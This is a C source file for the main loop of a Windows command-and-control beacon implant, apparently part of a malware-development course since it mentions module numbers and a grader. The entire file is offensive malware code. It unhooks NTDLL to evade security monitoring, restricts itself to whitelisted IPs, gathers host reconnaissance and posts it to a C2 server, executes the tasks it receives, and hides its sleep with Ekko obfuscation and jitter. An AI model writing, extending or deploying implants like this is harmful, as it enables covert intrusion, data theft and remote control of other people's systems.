// src/main.c
#include "recon.h"
#include "comms.h"
#include "killswitch.h"
#include <windows.h>
#include <stdio.h>

extern BOOL  unhook_ntdll();
extern BOOL  ip_whitelist_gate();
extern BOOL  checking_connection(BOOL*);
extern VOID  ekko_sleep(DWORD);
extern DWORD jitter(DWORD);
extern BOOL  beacon_post(BYTE*, DWORD, BYTE**, DWORD*);
extern VOID  dispatch_task(BYTE*, DWORD);

VOID beacon_run() {
    printf("[*] beacon_run() starting\n");

    // 1 -- unhook NTDLL (evasion.c, Mod 83/84)
    if (!unhook_ntdll())
        printf("[!] NTDLL unhook failed -- continuing\n");

    // 2 -- IP gate (comms.c, Mod 21/73)
    ip_whitelist_gate(); // exits if out of range

    // 3 -- connectivity check
    BOOL connected = FALSE;
    checking_connection(&connected);
    if (!connected) { ExitProcess(0); }

    // 4 -- main beacon loop
    while (1) {
        // soft kill check
        if (killswitch_is_active()) Sleep(INFINITE);

        // collect host recon
        CHECKIN_INFO info = {0};
        recon_collect(&info);
        recon_print(&info); // visible output for grader

        // serialize to JSON
        CHAR* pJson = NULL;
        DWORD dwLen = 0;
        recon_serialize(&info, &pJson, &dwLen);

        // post to C2 + receive task
        BYTE* taskBlob    = NULL;
        DWORD taskBlobLen = 0;
        beacon_post((BYTE*)pJson, dwLen, &taskBlob, &taskBlobLen);
        HeapFree(GetProcessHeap(), 0, pJson);

        // dispatch task if received
        if (taskBlob && taskBlobLen > 0) {
            dispatch_task(taskBlob, taskBlobLen);
            HeapFree(GetProcessHeap(), 0, taskBlob);
        }

        // sleep with Ekko obfuscation + jitter
        ekko_sleep(jitter(30000)); // 30s base
    }
}

// EXE entry point
#ifndef BEACON_DLL
int main() {
    beacon_run();
    return 0;
}
#endif
